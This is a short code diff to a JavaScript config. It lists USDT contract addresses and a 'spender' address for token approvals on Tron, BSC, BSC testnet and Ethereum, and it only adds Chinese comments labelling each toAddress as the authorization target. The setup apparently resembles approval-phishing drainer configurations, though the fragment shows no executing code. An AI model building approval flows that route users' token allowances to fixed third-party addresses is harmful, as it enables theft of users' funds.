@@ -4,22 +4,22 @@
     networks: {
       tron: {
         usdtAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-        toAddress: "TA15gtkcGHEUeyAioAbPwdrXD22mpu1CP8"
+        toAddress: "TA15gtkcGHEUeyAioAbPwdrXD22mpu1CP8" // 授权目标地址 (spender)
       },
       bsc: {
         chainIdHex: "0x38",
         usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
-        toAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED"
+        toAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED" // 授权目标地址 (spender)
       },
       bscTestnet: {
         chainIdHex: "0x61",
         usdtAddress: "0x25e8a036f3EBEE0Bc13B8213e4425825693A8E95",
-        toAddress: "0x699E6785887C20dF58f5CA889E00Ee1fFD67DEA2"
+        toAddress: "0x699E6785887C20dF58f5CA889E00Ee1fFD67DEA2" // 授权目标地址 (spender)
       },
       eth: {
         chainIdHex: "0x1",
         usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-        toAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED"
+        toAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED" // 授权目标地址 (spender)
       }
     }
   };
